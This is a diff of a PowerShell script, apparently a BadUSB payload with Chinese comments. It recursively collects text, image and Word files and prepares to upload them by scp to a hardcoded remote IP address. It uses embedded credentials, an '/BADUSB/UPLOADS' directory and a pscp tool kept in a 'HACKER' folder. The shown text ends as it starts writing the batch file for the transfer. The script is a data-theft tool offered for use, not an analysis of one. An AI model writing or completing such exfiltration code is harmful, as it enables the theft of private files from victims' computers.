@@ -1,7 +1,7 @@
 # 获取所有指定类型的文件
 $fileTypes = @('*.txt', '*.jpg', '*.png', '*.doc', '*.docx')
 $files = foreach ($fileType in $fileTypes) {
-    Get-ChildItem -Path 'd:/test' -Recurse -Filter $fileType
+    Get-ChildItem -Path 'c:/test' -Recurse -Filter $fileType
 }
 
 # 设置用户名、密码和远程路径
@@ -9,7 +9,7 @@ $username = "BADUSB"
 $password = "LJJYYDS"
 $remoteHost = "118.178.229.36"
 $remoteDir = "/BADUSB/UPLOADS"
-$scpPath = "D:\HACKER\pscp.exe"
+$scpPath = "C:\HACKER\PSCP.EXE"
 
 # 创建临时批处理文件来执行scp命令
 $tempBatchFile = [System.IO.Path]::GetTempFileName() + ".bat"
